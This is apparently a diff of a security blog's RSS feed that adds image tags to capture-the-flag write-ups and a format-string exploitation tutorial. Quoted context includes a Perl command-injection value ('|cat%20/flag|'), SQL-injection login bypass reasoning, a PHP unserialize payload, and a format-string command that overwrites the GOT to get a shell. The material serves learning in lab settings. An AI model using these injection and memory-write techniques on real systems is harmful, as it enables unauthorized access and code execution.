@@ -8,9 +8,9 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep000
 challenge 02&lt;/strong&gt;. This challenge is about &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After opening the challenge, we see the log search tool.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/log-search-tool.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The Log Search Tool is simple. It has two options. The first one is to
 select a file from a predefined list of files. And the second one is to
 type the term to find, which has to be at least four characters long.
@@ -33,7 +33,7 @@ returns &lt;code&gt;root:x:0:0:root:/root:/bin/bash&lt;/code&gt;.&lt;/p&gt;
 me to look at the source code of the webpage. There was a comment in the
 last line of the code: &lt;code&gt;&amp;lt;!--/src.txt--&amp;gt;&lt;/code&gt;. This file is freely
 accessible.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/perl-vulnerability.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;As you can see in the image, we have the server source code. It is
 written in Perl. Besides, notice what is inside the red rectangle. That
 line of code could be potentially vulnerable. At least, that is what the
@@ -45,18 +45,18 @@ we need to use the correct payload. I had a hard time building it, but I
 found an
 &lt;a href=&quot;https://perl-begin.org/topics/security/code-markup-injection/&quot;&gt;example&lt;/a&gt;.
 As a first step, I managed to print a message.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/execute-hello.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;In the same line, we could execute much more complex commands. For
 example, we could list all the files in a directory. But remember that
 to print it, we need the line to contain the &lt;strong&gt;term&lt;/strong&gt; query string
 value. To solve that, we could add a prefix to each file.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/execute-ls.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The previous image shows all the files contained in the root directory.
 We can see that one of the files is called &lt;code&gt;flag&lt;/code&gt;. Similarly, we can
 read the contents of the file sending a request with the &lt;strong&gt;term&lt;/strong&gt; and
 &lt;strong&gt;file&lt;/strong&gt; query strings equal to &lt;code&gt;solve&lt;/code&gt; and &lt;code&gt;|cat%20/flag|&lt;/code&gt;. With that,
 we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep001 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch02/</guid><description>Reverse engineer H4ck1ng G00gl3 ep001 challenge 02: analyze executable strings, disassemble code, and execute hidden functions to uncover the flag.</description><pubDate>Thu, 20 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -67,7 +67,7 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep001
 challenge 02&lt;/strong&gt;. This challenge is about &lt;strong&gt;Reverse Engineering&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After opening the challenge, we get a zip file containing an executable
 with the name &lt;code&gt;wannacry&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;As a first step, I extracted the strings from the executable with
@@ -86,7 +86,7 @@ the interesting part. With that in mind, I searched for how to
 disassemble a binary in Linux. I found &lt;code&gt;objdump&lt;/code&gt;, a command that allows
 printing the assembly code of the binary. The following image shows a
 fragment of the assembly code.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/objdump-function-example.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;With the assembly code in my power, I wrote down the functions and how
 they are related. Interestingly enough, the &lt;code&gt;main&lt;/code&gt; function does not
 call any other function. Besides, the only function not being called
@@ -94,13 +94,13 @@ anywhere in the code is one called &lt;code&gt;print&lt;/code&gt;. Probably, tha
 community was referring to with the second part of the hint.&lt;/p&gt;
 &lt;p&gt;I found gdb, a tool designed to debug C/C++ programs. Moreover, it can
 execute functions present in the binary. It is simple.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/gdb-execution.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;As you can see, executing the &lt;code&gt;print&lt;/code&gt; function gives us a new URL.
 Visiting the URL shows the following website.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/button-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After clicking the button, the flag will appear. With that, we completed
 the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Cryptopals: Break an ECB encrypted message (hard)</title><link>https://danielorihuela.dev/blog/break-ecb-2/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/break-ecb-2/</guid><description>Learn to break a message encrypted with the ECB block cipher mode (hard exercise).</description><pubDate>Mon, 28 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#break-ecb-mode-hard-level&quot;&gt;Break ECB mode (hard level)&lt;/a&gt;
 &lt;ul&gt;
@@ -277,27 +277,27 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post I explain how I solved &lt;strong&gt;ep000
 challenge 01&lt;/strong&gt;. This challenge is about &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After opening the challenge, we see the following screen.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/chess-main-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Winning the game at this point is not the intended way to solve the
 challenge. Nevertheless, I tried it :D. The problem is that the AI will
 cheat. After some movements, all the AI pawns will become queens.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/cheat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Out of curiosity, I decided to see the difficulty dropdown even though
 the hint said: &lt;code&gt;Don&apos;t make this game harder than it needs to be.&lt;/code&gt; As I
 expected, I did not find anything interesting there.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/difficulty.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;It was time to access the &lt;strong&gt;Master Login&lt;/strong&gt; area. There, we find a simple
 interface asking for the user and the password.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/admin-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I was on a webpage with a login prompt. The first thing that came to
 mind was a &lt;strong&gt;SQL Injection&lt;/strong&gt;. I did not know if a SQL database was in
 use. It was a guess. As an initial step, I tried to log in with a random
 username and password to check how a &quot;normal&quot; response would look. In
 that case, the website renders a message saying &quot;Invalid Login!&quot; and the
 server returns the HTTP status 200.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/login-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Now, I needed to check if the website was vulnerable to a &lt;strong&gt;SQL
 Injection&lt;/strong&gt; attack. In SQL, the &lt;strong&gt;single quote character&lt;/strong&gt; indicates the
 beginning and end of strings. Usually, that is one of the first used
@@ -319,7 +319,7 @@ query gives us:&lt;/p&gt;
 &lt;p&gt;That query returns any user with &quot;admin&quot; username or empty password. We
 were lucky because all the assumptions held, and we could log in as the
 admin user.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/admin-panel.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Here, we see a couple of options. The first one is used to change the
 &lt;strong&gt;thinking time&lt;/strong&gt; of the AI. The second one is to &lt;strong&gt;enable/disable the
 AI Queen Cheats&lt;/strong&gt;. Immediately, I disabled the AI Queen Cheats and tried
@@ -345,7 +345,7 @@ exceptions to the previous order. If the King is in check, the AI will
 put the King in a safe place or kill your piece. Now, winning the game
 was easy. Once you win, the webpage should print the flag on the screen.
 With that, we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Cryptopals: Break a repeating-key XOR message</title><link>https://danielorihuela.dev/blog/break-xor/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/break-xor/</guid><description>Learn to break a message encrypted with the XOR cipher and a repeating key.</description><pubDate>Mon, 11 Nov 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#xor-cipher&quot;&gt;XOR Cipher&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#break-xor-cipher-with-frequency-analysis&quot;&gt;Break XOR cipher with frequency
@@ -572,12 +572,12 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep001
 challenge 01&lt;/strong&gt;. This challenge is about &lt;strong&gt;Reverse Engineering&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After opening the challenge, we get a zip file. This zip file contains
 another compressed file that includes two files. We have the flag, even
 though we cannot read it yet. It is in binary. And an executable with
 the name wannacry.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/wannacry-manpage.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The wannacry executable takes an encrypted file and the encryption key
 as arguments. We already have the encrypted file, in other words, the
 flag file. However, we are missing the private key. The executable must
@@ -590,7 +590,7 @@ interesting. To do that, we can use the &quot;strings&quot; command in Linux.&lt
 extracted strings were gibberish. This approach was not good. Then, I
 searched for some keywords: flag, private, public, solve, decrypt,
 encrypt, etc. The keyword &quot;key&quot; lead me to a domain.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/http-with-pems.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I visited this domain and saw a list of private keys with long
 alphanumeric names. I did not have any hint about which of these private
 keys could be the one that I needed. Anyway, there were only around two
@@ -619,7 +619,7 @@ command.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;strings result| grep solve
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Cryptopals: Break an ECB encrypted message (easy)</title><link>https://danielorihuela.dev/blog/break-ecb/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/break-ecb/</guid><description>Learn to break a message encrypted with the ECB block cipher mode (easy exercise).</description><pubDate>Thu, 10 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#ecb-block-cipher-mode&quot;&gt;ECB block cipher mode&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#break-ecb-mode-easy-level&quot;&gt;Break ECB mode (easy level)&lt;/a&gt;
@@ -652,9 +652,9 @@ blocks. You might think that this shouldn&apos;t be a problem. However,
 identical plain blocks will return the same encrypted blocks. It becomes
 apparent when you see the following images.&lt;/p&gt;
 &lt;p&gt;&amp;lt;center&amp;gt; Plain image &amp;lt;/center&amp;gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/break-ecb/penguin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&amp;lt;center&amp;gt; Image encrypted with ECB mode &amp;lt;/center&amp;gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/break-ecb/ecb_penguin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The data was encrypted, but we can still see the penguin… more or less.
 Let&apos;s see how we can break this block cipher mode.&lt;/p&gt;
 &lt;h1&gt;Break ECB mode (easy level)&lt;/h1&gt;
@@ -1070,7 +1070,7 @@ let&apos;s see how to compile the program.&lt;/p&gt;
 &lt;/ul&gt;
 &lt;p&gt;Let&apos;s continue with the exploit. The following image shows two
 executions.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/print-input-vuln.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The first executions gets &lt;code&gt;&quot;something&quot;&lt;/code&gt; as input. The output is the
 expected one. The interesting part is in the second execution, where we
 pass &lt;code&gt;$(printf &quot;\x2c\xc0\x04\x08&quot;).%08x.%08x.%08x.%n&lt;/code&gt; as input (the dots
@@ -1088,7 +1088,7 @@ containing &lt;code&gt;\x2c\xc0\x04\x08&lt;/code&gt;. Therefore, &lt;code&gt;%n&
 that memory address, which happens to be &lt;code&gt;test_val&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Similarly, if we increment the width of some of the format string
 parameters, we can overwrite &lt;code&gt;test_val&lt;/code&gt; with higher values.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/print-input-vuln-400.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;That&apos;s seemingly stupid thing is really powerful. We can overwrite
 memory addresses with whatever value we want (e.g another memory
 address). That&apos;s the idea of the exploit. Let&apos;s jump to the following
@@ -1128,11 +1128,11 @@ this with gdb.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;gdb -q --batch --ex &quot;p 0xaa - 56 + 8&quot;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Now, we can execute the following to get the first byte.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/first-byte.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;For the following bytes, we have to do the same. However, to compute the
 numbers, we will use the formula &quot;expected value - previous written
 value&quot;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/ddccbbaa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Awesome! We know how to overwrite memory addresses, but we are rather
 limited. The bytes must be ordered in descending value. What if we want
 to write any arbitrary memory address? We cannot do something like
@@ -1143,14 +1143,14 @@ byte. In other words, instead of computing &quot;expected value - previous
 written value&quot; we will compute &quot;1(expected value) - previous written
 value&quot; (e.g. 0x1aa - 0xbb given that we want to write 0xaa). The
 procedure stays the same.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/aaccaabb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Amazing! But this is to much work, can&apos;t we simplify it a little bit?&lt;/p&gt;
 &lt;h1&gt;Direct access and short writes&lt;/h1&gt;
 &lt;p&gt;There are two ways to simplify the process. First, we can use direct
 access to avoid writing numerous format parameters. We can use &lt;code&gt;%n$d&lt;/code&gt;
 where &lt;code&gt;%n&lt;/code&gt; indicates the argument position and &lt;code&gt;$d&lt;/code&gt; indicates the format
 parameter type.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/direct-access.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We can simplify what we did in the previous section. Be aware that the
 structure changes a bit. We want to use
 &lt;code&gt;$(printf &quot;{address 1}{address 2}{address 3}{address 4}&quot;)%{number 1}x%4\$n%{number 2}x%5\$n%{number 3}x%6\$n%{number 4}x%7\$n%&lt;/code&gt;.
@@ -1159,12 +1159,12 @@ Notice that we no longer need:&lt;/p&gt;
 &lt;li&gt;the padding between memory addresses&lt;/li&gt;
 &lt;li&gt;to add 8 when computing the first value&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/direct-access-aaccaabb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;But that&apos;s not all. We can also use short writes to write two bytes at
 once. We need to use &lt;code&gt;%n$hd&lt;/code&gt;, remove the second and fourth memory
 addresses, and compute the new values.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/short-write.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/short-write-result.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Pretty neat, eh? With that knowledge, we could get a shell if we wanted
 to.&lt;/p&gt;
 &lt;h1&gt;Overwrite Global Offset Table to get a shell&lt;/h1&gt;
@@ -1240,13 +1240,13 @@ gdb -q --batch --ex &quot;p 0x1d9b8 - 0xffff&quot;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Get &lt;code&gt;exit&lt;/code&gt; address in GOT&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/got-table.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Exploit&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;./fmt.out $(printf &quot;\x7a\xb2\x04\x08\x78\xb2\x04\x08&quot;)%65527x%4\$hn%55737x%5\$hn
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/shell-execution.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;h1&gt;Conclusion&lt;/h1&gt;
@@ -1262,14 +1262,14 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep001
 challenge 03&lt;/strong&gt;. This challenge is about &lt;strong&gt;Reverse Engineering&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After opening the challenge, we see a chess website similar to the one
 in the ep000 ch01.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/chess.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Notice that now there is no link to the admin panel. We have to find
 another vulnerability. I checked the website source code and found the
 &lt;strong&gt;load_baseboard&lt;/strong&gt; function.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/load_board_code.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;This function returns the contents of the &quot;baseboard.fen&quot; file after a
 POST request to &lt;strong&gt;load_board.php&lt;/strong&gt;. I tried a couple of things at this
 point. Firstly, I tried to load a custom fen file with a winning state
@@ -1277,7 +1277,7 @@ for me. Secondly, I tried to get the output of a file in the system with
 a &lt;strong&gt;directory traversal attack&lt;/strong&gt;. I was not lucky. After thinking some
 time, I tried to get the source code of the &lt;strong&gt;index.php&lt;/strong&gt; file with a
 POST to the &lt;strong&gt;load_board.php&lt;/strong&gt;. It worked!&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/index_code.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I have been looking at the &lt;strong&gt;index.php&lt;/strong&gt; code for hours. The only
 interesting thing I saw was the following hint:
 &lt;code&gt;&quot;Winning against me won&apos;t help anymore. You need to get the flag from my envs.&quot;&lt;/code&gt;.
@@ -1336,9 +1336,9 @@ echo base64_encode(serialize($stockf));
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Finally, we only need to launch the HTTP request and search for the flag
 in the output.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/unserialize_exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Deploy blog written with org-mode on GitHub Pages</title><link>https://danielorihuela.dev/blog/deploy-blog-written-with-org-mode-on-github-pages/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/deploy-blog-written-with-org-mode-on-github-pages/</guid><description>Join me on my adventure to crafting a personal blog with Hugo, GitHub Pages, and GitHub Actions. Learn how to use these tools to create and deploy your own site effortlessly.</description><pubDate>Sun, 03 Jul 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#context&quot;&gt;Context&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#goal-expected-final-workflow&quot;&gt;Goal (expected final workflow)&lt;/a&gt;&lt;/li&gt;
@@ -1532,11 +1532,11 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep002
 challenge 01&lt;/strong&gt;. This challenge is about &lt;strong&gt;Steganography&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The challenge gives us the following image.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/challenge.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;It&apos;s an RGBA file.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/challenge-info.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The first thing that came to mind with my basic knowledge of image
 steganography was the &lt;strong&gt;LSB&lt;/strong&gt; (i.e. Least-Significant Bit) technique. I
 tried tens of different already built scripts and online tools. But I
@@ -1547,7 +1547,7 @@ no clue on how to proceed. It was time to ask the community for help.&lt;/p&gt;
 &lt;code&gt;Sometimes the answers are hidden in plain site&lt;/code&gt;. Also, they told me to
 take a look at the main webpage background. We can see the same image. I
 downloaded it and extracted the strings, which got me the following.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/website-strings.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Here, we have some information.&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;The information is hidden inside an &lt;strong&gt;SSL certificate&lt;/strong&gt;&lt;/li&gt;
@@ -1571,7 +1571,7 @@ hidden_message = [chr(int(byte, 2)) for byte in hidden_bytes]
 print(&apos;&apos;.join(hidden_message))
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;I was finally able to get something.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/certificate.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The next step was getting the flag from the certificate. I saved the
 result from the script into a file called &quot;certificate.ssl&quot; and executed
 the following.&lt;/p&gt;
@@ -1579,7 +1579,7 @@ the following.&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;After getting the output, we can see the flag in the &lt;strong&gt;issuer&lt;/strong&gt; field.
 With that, we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep002 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch02/</guid><description>Explore H4ck1ng G00gl3 ep002 challenge 02: install Timesketch via Docker, analyze logs, and uncover the flag in this thrilling forensics journey.</description><pubDate>Fri, 04 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -1590,7 +1590,7 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep002
 challenge 02&lt;/strong&gt;. This challenge is about &lt;strong&gt;Forensics&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
